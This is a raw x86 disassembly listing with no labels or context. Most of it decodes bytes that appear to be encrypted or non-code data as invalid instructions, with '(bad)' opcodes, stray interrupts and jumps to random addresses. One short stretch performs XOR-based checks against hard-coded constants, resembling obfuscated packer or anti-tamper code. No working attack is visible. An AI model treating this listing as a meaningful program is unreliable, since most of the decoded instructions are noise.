  4151c9:	push   0xffffffba
  4151cb:	fmulp  st(6),st
  4151cd:	in     al,0x96
  4151cf:	sbb    BYTE PTR [ecx],0x4c
  4151d2:	rol    BYTE PTR [esp+esi*2-0x6d],1
  4151d6:	xor    eax,0xbd1f0049
  4151db:	sahf   
  4151dc:	add    DWORD PTR [ebx-0x13],ebp
  4151df:	inc    ebp
  4151e0:	adc    cl,BYTE PTR [edx-0x1c146c24]
  4151e6:	aad    0x3e
  4151e8:	dec    esi
  4151e9:	enter  0x3bf3,0xe3
  4151ed:	test   eax,0x111f151f
  4151f2:	push   0xffffffc9
  4151f4:	jle    0x4151ed
  4151f6:	in     al,dx
  4151f7:	cmp    BYTE PTR [eax+0x40],dh
  4151fa:	inc    eax
  4151fb:	es iret 
  4151fd:	mov    ecx,ds
  4151ff:	(bad)  
  415200:	pop    edi
  415201:	push   esi
  415202:	mov    WORD PTR [edi+0x65428913],cx
  415209:	int    0x6
  41520b:	dec    edi
  41520c:	inc    ebp
  41520d:	mov    edi,DWORD PTR [esi]
  41520f:	xor    DWORD PTR ss:[eax+ebx*8-0x52],edx
  415214:	and    BYTE PTR ds:0xb8ca4507,ch
  41521a:	pavgw  mm0,QWORD PTR [eax+0x3dacd30e]
  415221:	ds icebp 
  415223:	sbb    cl,BYTE PTR [edi]
  415225:	mov    ebp,0xe38eb725
  41522a:	jg     0x41526f
  41522c:	daa    
  41522d:	hlt    
  41522e:	pop    es
  41522f:	test   esp,0xc348e9d1
  415235:	retf   
  415236:	pop    ecx
  415237:	imul   edx,DWORD PTR [ebp+0x2aace27c],0x17
  41523e:	fsub   QWORD PTR [eax+ebp*1]
  415241:	mov    esi,0x590312b4
  415246:	jmp    0x4151ed
  415248:	(bad)  
  415249:	(bad)  [ecx+ecx*4+0x701fc5e7]
  415250:	xchg   edx,eax
  415251:	adc    BYTE PTR [edi],bl
  415253:	lahf   
  415254:	inc    eax
  415255:	mov    ds:0x6c015998,al
  41525a:	nop
  41525b:	and    bh,bh
  41525d:	hlt    
  41525e:	xchg   ebp,eax
  41525f:	jle    0x4152d1
  415261:	sub    BYTE PTR [esi-0x6ace240a],0xf7
  415268:	push   0x39db69f1
  41526d:	cmp    DWORD PTR [edx],eax
  41526f:	div    cl
  415271:	mov    edi,0x30e788e1
  415276:	adc    eax,0xde72c7f2
  41527b:	push   esp
  41527c:	cdq    
  41527d:	xchg   ebx,eax
  41527e:	dec    edi
  41527f:	fdivrp st(6),st
  415281:	xchg   ebx,eax
  415282:	sub    eax,0xa5c1a0c8
  415287:	int    0xd8
  415289:	sub    eax,0x470e68e1
  41528e:	jge    0x41522a
  415290:	ins    DWORD PTR es:[edi],dx
  415291:	mov    BYTE PTR [ebp-0x58cef333],ah
  415297:	fstp   QWORD PTR [esp+edi*2]
  41529a:	jg     0x415225
  41529c:	xor    BYTE PTR [edi-0x7],dl
  41529f:	mov    cl,0xc6
  4152a1:	adc    DWORD PTR [ebx+0x4c],ecx
  4152a4:	(bad)  
  4152a5:	mov    ch,0xac
  4152a7:	bsf    eax,DWORD PTR [ebp+0xd2cb3cf]
  4152ae:	(bad)  
  4152af:	aas    
  4152b0:	pusha  
  4152b1:	fs jecxz 0x415313
  4152b4:	jg     0x415316
  4152b6:	push   ebx
  4152b7:	test   DWORD PTR [eax+0x6a8605d7],ebp
  4152bd:	stos   DWORD PTR es:[edi],eax
  4152be:	adc    BYTE PTR [esi],ah
  4152c0:	out    dx,al
  4152c1:	pop    ds
  4152c2:	iret   
  4152c3:	inc    esp
  4152c4:	xchg   edi,eax
  4152c5:	es dec esi
  4152c7:	adc    esp,ebx
  4152c9:	popf   
  4152ca:	jmp    0x4152b6
  4152cc:	mov    dl,0x70
  4152ce:	dec    ecx
  4152cf:	push   ss
  4152d0:	sti    
  4152d1:	dec    esi
  4152d2:	and    esp,DWORD PTR [ebx+0x1d]
  4152d5:	pop    ebx
  4152d6:	fsub   DWORD PTR [eax-0x5182117e]
  4152dc:	mov    ds:0x255ae617,eax
  4152e1:	clc    
  4152e2:	jmp    0x65e47957
  4152e7:	pop    edi
  4152e8:	ja     0x4152b9
  4152ea:	or     al,0xe0
  4152ec:	or     edi,DWORD PTR [ebx*4-0x22b30464]
  4152f3:	mov    ds:0xbee73fd1,eax
  4152f8:	mov    dh,0x54
  4152fa:	push   esp
  4152fb:	in     eax,0x63
  4152fd:	mov    dl,0x7d
  4152ff:	fimul  WORD PTR [esi]
  415301:	xor    al,0x5
  415303:	ror    BYTE PTR [edi-0x78],cl
  415306:	lods   al,BYTE PTR ds:[esi]
  415307:	mov    esi,0x179a7ad6
  41530c:	xchg   BYTE PTR [edx],bl
  41530e:	dec    ebp
  41530f:	inc    ebp
  415310:	sbb    esp,DWORD PTR [esi]
  415312:	jnp    0x415347
  415314:	std    
  415315:	jg     0x415340
  415317:	xor    BYTE PTR [esi+0x7666a23e],bl
  41531d:	call   0x165710bc
  415322:	imul   esi,DWORD PTR [esi-0x17],0x6489b87
  415329:	xchg   ebx,eax
  41532a:	mov    ch,0xa4
  41532c:	inc    edx
  41532d:	or     ch,BYTE PTR [eax+eax*1-0x5a]
  415331:	aam    0xa
  415333:	mov    BYTE PTR [edi-0x51],cl
  415336:	pushf  
  415337:	loopne 0x415320
  415339:	loopne 0x4152f3
  41533b:	std    
  41533c:	das    
  41533d:	mov    ds:0xaff2ad5c,eax
  415342:	fwait
  415343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415344:	sub    BYTE PTR [ecx-0x689bdfc9],ch
  41534a:	lods   eax,DWORD PTR ds:[esi]
  41534b:	push   eax
  41534c:	shr    bl,1
  41534e:	jno    0x415351
  415350:	sub    BYTE PTR [esi+0x120bcf61],ah
  415356:	or     BYTE PTR [ecx-0x6d22af3b],0x78
  41535d:	scas   eax,DWORD PTR es:[edi]
  41535e:	cwde   
  41535f:	(bad)  
  415360:	mov    edx,0xacb66c0
  415365:	aad    0x51
  415367:	sub    cl,BYTE PTR [ecx-0x594a607c]
  41536d:	shl    al,0x54
  415370:	fisttp QWORD PTR [eax-0x244d8802]
  415376:	gs out dx,eax
  415378:	jmp    0x21137938
  41537d:	ficom  WORD PTR [ebp+0x73]
  415380:	out    dx,al
  415381:	dec    ebp
  415382:	bound  edi,QWORD PTR [esi-0x494e3314]
  415388:	adc    BYTE PTR [ecx+0x3a],0x2f
  41538c:	fmul   QWORD PTR [ebx]
  41538e:	cmp    edx,DWORD PTR [edi-0x6c]
  415391:	cli    
  415392:	sub    BYTE PTR [eax],dl
  415394:	mov    bl,0x51
  415396:	fadd   QWORD PTR [esi]
  415398:	imul   esp,DWORD PTR [ecx+0x34608a46],0xffffffcc
  41539f:	jbe    0x41533b
  4153a1:	in     eax,dx
  4153a2:	icebp  
  4153a3:	dec    edx
  4153a4:	mov    edx,0xc73a2fa2
  4153a9:	ret    0x4e09
  4153ac:	test   ebp,ebx
  4153ae:	jg     0x4153b2
  4153b0:	mov    eax,ds:0x803ee17c
  4153b5:	mov    BYTE PTR [esi-0x43fd6633],bh
  4153bb:	sbb    DWORD PTR [esp+ebp*4+0x6d96082f],ecx
  4153c2:	leave  
  4153c3:	xchg   BYTE PTR [edi-0x5a3772fc],dh
  4153c9:	push   ebp
  4153ca:	push   es
  4153cb:	adc    DWORD PTR [ecx-0x5f],esi
  4153ce:	mov    BYTE PTR [ecx],cl
  4153d0:	xchg   edi,eax
  4153d1:	repnz mov cl,0xdc
  4153d4:	push   0xfb269250
  4153d9:	xchg   edx,eax
  4153da:	mov    al,0x91
  4153dc:	push   esp
  4153dd:	(bad)  
  4153de:	ja     0x41540e
  4153e0:	(bad)  
  4153e1:	and    DWORD PTR [ecx+0x28c36e45],esi
  4153e7:	sbb    BYTE PTR [eax+0x4e],dh
  4153ea:	loopne 0x415459
  4153ec:	mov    dh,0x8e
  4153ee:	xchg   DWORD PTR [esi],ebx
  4153f0:	shl    BYTE PTR [edx-0x67],cl
  4153f3:	cmp    ebx,DWORD PTR [edi-0x20]
  4153f6:	out    dx,al
  4153f7:	adc    eax,0x658dafa
  4153fc:	(bad)  
  4153fd:	in     al,0x13
  4153ff:	pop    eax
  415400:	xor    BYTE PTR [esp+ecx*2+0x3c],cl
  415404:	jmp    0x805acc53
  415409:	or     eax,0x59449a67
  41540e:	push   ebx
  41540f:	xor    eax,0xce4ed43
  415414:	adc    al,0xa6
  415416:	push   edi
  415417:	cmp    BYTE PTR [edx],0x3d
  41541a:	fcomi  st,st(1)
  41541c:	pushf  
  41541d:	js     0x4153ac
  41541f:	out    0x99,eax
  415421:	xchg   edx,eax
  415422:	loop   0x415434
  415424:	mov    ch,BYTE PTR [edi]
  415426:	sub    esp,DWORD PTR [ebp-0x14]
  415429:	loope  0x41546e
  41542b:	jmp    0xede73e24
  415430:	lock rol edi,0x23
  415434:	xor    DWORD PTR [ecx],esi
  415436:	adc    dh,dh
  415438:	fmul   DWORD PTR [ecx-0x4b]
  41543b:	pop    esp
  41543c:	sub    BYTE PTR [esi+0x3a],bh
  41543f:	xchg   ebx,eax
  415440:	js     0x415453
  415442:	xchg   DWORD PTR [ebx+0x56],ebp
  415445:	pop    ecx
  415446:	jb     0x41543e
  415448:	inc    edx
  415449:	mov    bh,0x8a
  41544b:	es fs sbb edx,esp
  41544f:	lds    esp,FWORD PTR [edi]
  415451:	sahf   
  415452:	sbb    cl,bl
  415454:	dec    ebx
  415455:	repz rol DWORD PTR [ecx],1
  415458:	add    ebx,eax
  41545a:	sub    eax,0x877a7aef
  41545f:	dec    edx
  415460:	loope  0x41548f
  415462:	push   ebx
  415463:	shl    DWORD PTR [edi],cl
  415465:	scas   al,BYTE PTR es:[edi]
  415466:	jmp    0xda2a:0xfb86517e
  41546d:	dec    esp
  41546e:	pop    ss
  41546f:	cmp    al,0x4e
  415471:	mov    cl,0x9
  415473:	test   dl,0xdb
  415476:	push   edi
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xae
  4154c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c9:	ins    BYTE PTR es:[edi],dx
  4154ca:	xchg   edx,eax
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xd770707e
  4154d4:	sbb    eax,DWORD PTR [edx+0x14bde2a0]
  4154da:	lods   eax,DWORD PTR ds:[esi]
  4154db:	push   ss
  4154dc:	mov    ds:0x2b47e359,eax
  4154e1:	mov    bh,0xa3
  4154e3:	inc    edi
  4154e4:	fnstenv [edi]
  4154e6:	(bad)  
  4154e7:	cli    
  4154e8:	ret    0xa048
  4154eb:	adc    BYTE PTR [ebp+0x149c9466],ah
  4154f1:	or     ecx,DWORD PTR [edi+0x77]
  4154f4:	adc    DWORD PTR ds:0x57d738fa,eax
  4154fa:	popa   
  4154fb:	adc    al,0x57
  4154fd:	(bad)  
  4154fe:	adc    BYTE PTR [ebp+0x17],0x2a
  415502:	sahf   
  415503:	sub    eax,0x8d1314a8
  415508:	jmp    0xb636be27
  41550d:	scas   eax,DWORD PTR es:[edi]
  41550e:	(bad)  
  41550f:	call   0x85bc44fe
  415514:	xchg   edx,eax
  415515:	xchg   ebp,eax
  415516:	push   ss
  415517:	retf   
  415518:	outs   dx,BYTE PTR ds:[esi]
  415519:	cs add eax,0xfa5008dc
  41551f:	sub    eax,0x29490ca4
  415524:	adc    cl,0x39
  415527:	popa   
  415528:	retf   0x31ec
  41552b:	std    
  41552c:	lds    ecx,FWORD PTR [ebx-0x1af8e652]
  415532:	or     bh,BYTE PTR [eax+0x4a312394]
  415538:	mov    bl,0x18
  41553a:	call   0x7ae1:0x90aad24a
  415541:	hlt    
  415542:	jle    0x415533
  415544:	in     al,dx
  415545:	repnz inc ebx
  415547:	sbb    DWORD PTR [edx+0x3c46a4be],ebx
  41554d:	or     esi,DWORD PTR [ebp+0x662abb49]
  415553:	ficomp WORD PTR [edx]
  415555:	push   edi
  415556:	xor    al,0x79
  415558:	and    ecx,ebp
  41555a:	retf   0xacde
  41555d:	sar    DWORD PTR [ebx-0x10],cl
  415560:	imul   BYTE PTR [ebp-0x6aa5f76e]
  415566:	test   al,0x95
  415568:	imul   edi,DWORD PTR [ecx],0x41728553
  41556e:	(bad)  
  41556f:	mov    esp,0x3f33fd31
  415574:	iret   
  415575:	and    BYTE PTR [esi+ebx*8+0x19],ah
  415579:	xchg   ebx,eax
  41557a:	add    ah,BYTE PTR ds:0x4db9d376
  415580:	ja     0x415562
  415582:	jecxz  0x4155c5
  415584:	jmp    0x6b7704ea
  415589:	daa    
  41558a:	ffreep st(6)
  41558c:	mov    dl,0xc9
  41558e:	not    BYTE PTR [edx+0x349f1e14]
  415594:	xchg   edx,eax
  415595:	adc    al,BYTE PTR [esi-0x37]
  415598:	sub    edi,DWORD PTR [edi-0x3506d0ae]
  41559e:	add    DWORD PTR [ebx-0x3ca01a97],0x3bb6aefb
  4155a8:	ror    ch,0xcb
  4155ab:	loopne 0x415601
  4155ad:	mov    ah,cl
  4155af:	xor    esp,esp
  4155b1:	sbb    BYTE PTR [ebx],0xcf
  4155b4:	mov    BYTE PTR [edi],dl
  4155b6:	(bad)  
  4155b7:	lds    ebp,FWORD PTR [ebx+0x6f]
  4155ba:	scas   al,BYTE PTR es:[edi]
  4155bb:	xchg   esp,eax
  4155bc:	nop
  4155bd:	(bad)  
  4155be:	mov    eax,0x1cffb077
  4155c3:	dec    esi
  4155c4:	div    BYTE PTR [edx+edi*8+0x31]
  4155c8:	es xchg edi,eax
  4155ca:	sbb    ebx,edx
  4155cc:	add    BYTE PTR [edx-0x3e],cl
  4155cf:	and    cl,BYTE PTR [eax]
  4155d1:	cmc    
  4155d2:	rcr    DWORD PTR [edx],1
  4155d4:	push   ebp
  4155d5:	and    cl,BYTE PTR [edx]
  4155d7:	ds inc edx
  4155d9:	and    al,0x5f
  4155db:	cmc    
  4155dc:	jecxz  0x415654
  4155de:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e0:	fcom   QWORD PTR [esi]
  4155e2:	int3   
  4155e3:	cmp    eax,0x90dc8960
  4155e8:	xchg   edi,eax
  4155e9:	clc    
  4155ea:	push   0xffffffa2
  4155ec:	and    ecx,ebx
  4155ee:	dec    ebx
  4155ef:	lock xchg edx,eax
  4155f1:	cmp    eax,0x4ab62c2a
  4155f6:	sbb    eax,0x827fe308
  4155fb:	sub    esi,DWORD PTR [ecx]
  4155fd:	pop    edx
  4155fe:	cmp    ebp,DWORD PTR [ecx]
  415600:	pop    ebx
  415601:	scas   eax,DWORD PTR es:[edi]
  415602:	cmp    ah,BYTE PTR [edx+0x8924d42]
  415608:	fcmovu st,st(1)
  41560a:	in     al,dx
  41560b:	jl     0x415635
  41560d:	(bad)
  415610:	nop
  415611:	dec    eax
  415612:	cmc    
  415613:	push   ebx
  415614:	icebp  
  415615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415616:	scas   eax,DWORD PTR es:[edi]
  415617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415618:	xchg   dh,dh
  41561a:	add    DWORD PTR [esi+0x46dedc23],eax
  415620:	aam    0x76
  415622:	loopne 0x4155fb
  415624:	jnp    0x415679
  415626:	fsubr  st(1),st
  415628:	cmp    DWORD PTR es:0x84cd947d,ebp
  41562f:	fs or  edx,ebx
  415632:	sub    DWORD PTR es:[esi],0xa6526d13
  415639:	xchg   ebx,eax
  41563a:	les    ebp,FWORD PTR [ecx-0x5169e635]
  415640:	mov    ecx,0x7fa29947
  415645:	ins    BYTE PTR es:[edi],dx
  415646:	or     BYTE PTR [ebp+ebp*8+0x29],ch
  41564a:	jb     0x4155d0
  41564c:	push   es
  41564d:	call   0xcc8c:0xf27686c2
  415654:	js     0x415600
  415656:	ror    edx,0xb0
  415659:	call   0xed3b:0x2de78551
  415660:	adc    eax,0x7e609ab6
  415665:	push   eax
  415666:	xchg   ebx,eax
  415667:	rcl    BYTE PTR [eax-0x3d],0x26
  41566b:	mov    ss,WORD PTR [esi-0x45]
  41566e:	or     ebp,eax
  415670:	hlt    
  415671:	in     al,dx
  415672:	xchg   esp,eax
  415673:	pop    ebx
  415674:	scas   eax,DWORD PTR es:[edi]
  415675:	fsubr  QWORD PTR [ecx-0x792422cf]
  41567b:	aad    0xa8
  41567d:	out    dx,al
  41567e:	(bad)  
  41567f:	mov    dh,0x80
  415681:	icebp  
  415682:	xchg   esp,eax
  415683:	mov    edi,0x929f21d9
  415688:	ret    
  415689:	add    ebp,ebp
  41568b:	xchg   edx,eax
  41568c:	inc    edx
  41568d:	push   edx
  41568e:	add    al,0xc4
  415690:	es cld 
  415692:	(bad)  
  415694:	xor    ecx,DWORD PTR [esi]
  415696:	out    dx,al
  415697:	ins    BYTE PTR es:[edi],dx
  415698:	mov    cl,0x71
  41569a:	add    ch,BYTE PTR [eax]
  41569c:	aaa    
  41569d:	sahf   
  41569e:	jecxz  0x4156f4
  4156a0:	lahf   
  4156a1:	mov    esp,0x8c1fffef
  4156a6:	int    0x6d
  4156a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a9:	xchg   ecx,eax
  4156aa:	ret    0x793d
  4156ad:	inc    DWORD PTR [edi]
  4156af:	in     al,0x54
  4156b1:	aad    0x66
  4156b3:	dec    esi
  4156b4:	mov    ecx,0x6f9047fb
  4156b9:	sub    esi,DWORD PTR [ebx-0x40ade1a8]
  4156bf:	mov    bl,0xc1
  4156c1:	jbe    0x41569e
  4156c3:	mov    bh,0x44
  4156c5:	sbb    al,0xe9
  4156c7:	lahf   
  4156c8:	dec    eax
  4156c9:	rcl    DWORD PTR [ecx+esi*8-0x17],1
  4156cd:	ins    DWORD PTR es:[edi],dx
  4156ce:	mov    ecx,edx
  4156d0:	mov    cl,BYTE PTR [ecx]
  4156d2:	std    
  4156d3:	and    BYTE PTR [eax-0x5598ec69],dh
  4156d9:	xor    al,bh
  4156db:	push   esi
  4156dc:	call   0x41c931ad
  4156e1:	repz data16 aaa 
  4156e4:	dec    ebx
  4156e5:	sti    
  4156e6:	outs   dx,BYTE PTR ds:[esi]
  4156e7:	das    
  4156e8:	(bad)  
  4156e9:	mov    edi,0x3a775a9
  4156ee:	pop    ss
  4156ef:	pop    edi
  4156f0:	xor    eax,0x1b31f241
  4156f5:	daa    
  4156f6:	outs   dx,BYTE PTR ds:[esi]
  4156f7:	jnp    0x415774
  4156f9:	popa   
  4156fa:	(bad)  
  4156fb:	and    DWORD PTR [edi+0x49],ebx
  4156fe:	leave  
  4156ff:	jb     0x415764
  415701:	jnp    0x4156b2
  415703:	mov    eax,0xfa43f67f
  415708:	rcl    bl,cl
  41570a:	sbb    esi,DWORD PTR [edx+0x12]
  41570d:	(bad)  
  41570e:	and    esp,ebp
  415710:	stos   DWORD PTR es:[edi],eax
  415711:	push   eax
  415712:	pusha  
  415713:	rcl    DWORD PTR [edx-0x63aa3d4a],0xd1
  41571a:	shr    BYTE PTR [edx-0x41dfb685],1
  415720:	ficom  WORD PTR [ecx]
  415722:	jne    0x415714
  415724:	and    edx,edx
  415726:	cdq    
  415727:	or     DWORD PTR [ecx],ecx
  415729:	xor    al,0x5c
  41572b:	jbe    0x4156b9
  41572d:	xlat   BYTE PTR ds:[ebx]
  41572e:	mov    esi,DWORD PTR [ebx+esi*8]
  415731:	scas   al,BYTE PTR es:[edi]
  415732:	leave  
  415733:	test   al,0xc1
  415735:	test   BYTE PTR [ebp+0x3d46f9d3],0xd6
  41573c:	pop    edi
  41573d:	outs   dx,BYTE PTR ds:[esi]
  41573e:	add    eax,0xcf1f8ea5
  415743:	and    BYTE PTR [eax+0x44],ah
  415746:	dec    esp
  415747:	pushf  
  415748:	retf   
  415749:	je     0x4156d2
  41574b:	fnstsw WORD PTR [ebx]
  41574d:	pop    ebx
  41574e:	in     al,0xed
  415750:	pop    es
  415751:	jge    0x4157b8
  415753:	and    al,0x96
  415755:	sub    BYTE PTR [ecx],ah
  415757:	pusha  
  415758:	outs   dx,BYTE PTR ds:[esi]
  415759:	hlt    
  41575a:	and    BYTE PTR [edi-0x42544990],cl
  415760:	jae    0x415723
  415762:	add    dl,BYTE PTR [edi+esi*1+0x24e69730]
  415769:	jo     0x415764
  41576b:	retf   0x3798
  41576e:	sahf   
  41576f:	mov    DWORD PTR [edi+0xd],ebx
  415772:	sahf   
  415773:	pop    ss
  415774:	(bad)  
  415775:	mov    BYTE PTR [edi+0x55754378],ch
  41577b:	es retf 0xa68d
  41577f:	jne    0x415709
  415781:	test   eax,0x77d7de06
  415786:	adc    ebp,0x823f1a45
  41578c:	daa    
  41578d:	adc    eax,DWORD PTR [ebx-0x125d9e07]
  415793:	and    al,0x28
  415795:	xchg   edi,eax
  415796:	les    ebp,FWORD PTR [esi-0x63412dc4]
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ecx+0x7f700eab],al
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x4157bb
  4157c4:	pop    edi
  4157c5:	sub    DWORD PTR [ebp-0x5a],edi
  4157c8:	mov    BYTE PTR [eax],ah
  4157ca:	dec    ebx
  4157cb:	dec    esp
  4157cc:	(bad)  
  4157cd:	sbb    al,0xb9
  4157cf:	stc    
  4157d0:	cmp    eax,0xdf48c3e1
  4157d5:	mov    ds:0x34fb2eed,eax
  4157da:	fbstp  TBYTE PTR [esp+eax*4+0x1c]
  4157de:	xchg   edx,eax
  4157df:	mov    eax,0x8684cb03
  4157e4:	mov    cl,0xe9
  4157e6:	xor    eax,0x4dbd745
  4157eb:	loopne 0x4157ca
  4157ed:	mov    ah,0x88
  4157ef:	nop
  4157f0:	xchg   esi,eax
  4157f1:	ds loop 0x41582a
  4157f4:	xor    BYTE PTR [edi+0x10],ah
  4157f7:	cmp    cl,dh
  4157f9:	scas   al,BYTE PTR es:[edi]
  4157fa:	lahf   
  4157fb:	sub    al,0xc5
  4157fd:	in     al,dx
  4157fe:	xor    DWORD PTR [ebp-0x6051d4ff],ecx
  415804:	jmp    0xe3bc3ef9
  415809:	fwait
  41580a:	ss inc ebx
  41580c:	mov    ds:0x411801c4,eax
  415811:	dec    edi
  415812:	mov    dl,0xfb
  415814:	sbb    edx,DWORD PTR [ebp-0x57]
  415817:	test   BYTE PTR [edx-0x3a1aa05a],bh
  41581d:	sub    ah,ch
  41581f:	push   edi
  415820:	into   
  415821:	iret   
  415822:	xor    eax,0xb545eba6
  415827:	(bad)  
  415828:	neg    BYTE PTR [edx]
  41582a:	inc    edi
  41582b:	ins    BYTE PTR es:[edi],dx
  41582c:	test   BYTE PTR [ebx],dh
  41582e:	push   esi
  41582f:	push   0x59
  415831:	mov    eax,ds:0xd5e2a2e9
  415836:	xchg   BYTE PTR [ebx],bh
  415838:	in     al,0x64
  41583a:	add    eax,0x93dd288d
  41583f:	jmp    0x415865
  415841:	enter  0x89cf,0xf8
  415845:	sub    DWORD PTR [edx],ebp
  415847:	ja     0x415885
  415849:	ss out 0x3d,al
  41584c:	data16 sahf 
  41584e:	xlat   BYTE PTR ds:[ebx]
  41584f:	and    eax,0x9698b776
  415854:	inc    ebp
  415855:	clc    
  415856:	stos   DWORD PTR es:[edi],eax
  415857:	loopne 0x41583f
  415859:	cmc    
  41585a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41585b:	inc    ecx
  41585c:	out    0x69,al
  41585e:	mov    esp,0x56cd50d9
  415863:	cmc    
  415864:	div    BYTE PTR [edx-0x3a]
  415867:	out    0x9c,al
  415869:	cmp    al,ch
  41586b:	xor    BYTE PTR [esi+0x42],ah
  41586e:	cwde   
  41586f:	shl    BYTE PTR [ecx+0x6f],cl
  415872:	cmp    eax,DWORD PTR [ecx]
  415874:	jmp    0x2dc57a16
  415879:	pop    edi
  41587a:	xchg   ebx,eax
  41587b:	nop
  41587c:	fisttp WORD PTR [ebx+0x2b]
  41587f:	loopne 0x415860
  415881:	mov    eax,0xab4a0f94
  415886:	scas   eax,DWORD PTR es:[edi]
  415887:	aas    
  415888:	in     eax,0x8b
  41588a:	ss in  al,dx
  41588c:	adc    al,0xc0
  41588e:	fcomp  DWORD PTR [edx+0x2b]
  415891:	adc    al,0xec
  415893:	fistp  DWORD PTR [esi-0x7f]
  415896:	ins    BYTE PTR es:[edi],dx
  415897:	and    dl,cl
  415899:	popf   
  41589a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41589b:	adc    ebx,DWORD PTR [esi]
  41589d:	pop    eax
  41589e:	xchg   esi,eax
  41589f:	mov    dh,0x83
  4158a1:	aaa    
  4158a2:	imul   ebp,DWORD PTR [ecx-0x5a],0xe46c4bf5
  4158a9:	pop    edx
  4158aa:	outs   dx,DWORD PTR ds:[esi]
  4158ab:	push   ss
  4158ac:	pop    esp
  4158ad:	outs   dx,DWORD PTR ds:[esi]
  4158ae:	int3   
  4158af:	sub    al,0x98
  4158b1:	es test ch,al
  4158b4:	and    eax,DWORD PTR [edi-0x68]
  4158b7:	lods   eax,DWORD PTR ds:[esi]
  4158b8:	shr    BYTE PTR [ecx+0x5337694c],0x4b
  4158bf:	(bad)  
  4158c0:	mov    ds:0xd6a1a31f,al
  4158c5:	int3   
  4158c6:	mov    esi,0x2f14b046
  4158cb:	xchg   ecx,eax
  4158cc:	or     DWORD PTR [esi-0x732e638b],eax
  4158d2:	push   cs
  4158d3:	clc    
  4158d4:	enter  0x7c27,0x4c
  4158d8:	dec    esp
  4158d9:	test   BYTE PTR [eax-0x32],cl
  4158dc:	push   ebx
  4158dd:	push   ds
  4158de:	(bad)  
  4158e0:	add    DWORD PTR [ebx],esi
  4158e2:	aam    0x5d
  4158e4:	out    0x43,eax
  4158e6:	dec    esi
  4158e7:	test   cl,ch
  4158e9:	xchg   esi,eax
  4158ea:	out    dx,eax
  4158eb:	scas   eax,DWORD PTR es:[edi]
  4158ec:	int3   
  4158ed:	scas   eax,DWORD PTR es:[edi]
  4158ee:	sar    DWORD PTR [edi+0x16],cl
  4158f1:	push   es
  4158f2:	retf   
  4158f3:	sub    edx,DWORD PTR [ebx]
  4158f5:	aas    
  4158f6:	and    dl,BYTE PTR [esi-0x6ff95335]
  4158fc:	cmp    edx,edi
  4158fe:	mov    ds:0x176a7b2c,eax
  415903:	shl    BYTE PTR [esi],cl
  415905:	xchg   edx,eax
  415906:	xchg   edx,eax
  415907:	dec    esp
  415908:	sub    bl,al
  41590a:	das    
  41590b:	jo     0x415935
  41590d:	outs   dx,BYTE PTR ds:[esi]
  41590e:	lods   eax,DWORD PTR ds:[esi]
  41590f:	mov    ds:0x2525faf0,al
  415914:	cmc    
  415915:	push   ebx
  415916:	jp     0x415907
  415918:	pop    es
  415919:	fidivr WORD PTR [ecx-0x70849f77]
  41591f:	lds    ecx,FWORD PTR [ebp-0x3a]
  415922:	ret    
  415923:	sbb    al,0x6b
  415925:	popa   
  415926:	dec    DWORD PTR [ebx+0x4]
  415929:	add    BYTE PTR [ecx+0xf],ah
  41592c:	sahf   
  41592d:	(bad)  
  41592e:	imul   ebx,DWORD PTR [eax+esi*4-0x29],0x13
  415933:	inc    edi
  415934:	mov    al,0xc2
  415936:	mov    ?,WORD PTR [eax+eax*8-0x15de8d60]
  41593d:	mov    ebp,DWORD PTR [ecx-0x7b1dece]
  415943:	(bad)  
  415944:	retf   
  415945:	ds mov edi,0xd8309fd7
  41594b:	aam    0xd8
  41594d:	test   al,0x63
  41594f:	push   es
  415950:	lods   eax,DWORD PTR ds:[esi]
  415951:	sub    al,BYTE PTR [edx+0x31af55dc]
  415957:	int    0x3f
  415959:	enter  0xb069,0x7
  41595d:	jg     0x4158f2
  41595f:	jp     0x41599e
  415961:	mov    ah,0xac
  415963:	cwde   
  415964:	dec    ecx
  415965:	jnp    0x4158e7
  415967:	mov    al,ds:0xc91fb517
  41596c:	inc    DWORD PTR gs:[esi+0x52]
  415970:	sub    BYTE PTR [ecx-0x5609f5c0],0xc9
  415977:	mov    ecx,0x7845bc73
  41597c:	rcl    cl,1
  41597e:	dec    edi
  41597f:	jmp    0x41590e
  415981:	jg     0x415932
  415983:	mov    ebp,0x587e88d2
  415988:	(bad)
  41598b:	call   0x105d1084
  415990:	ret    
  415991:	scas   eax,DWORD PTR es:[edi]
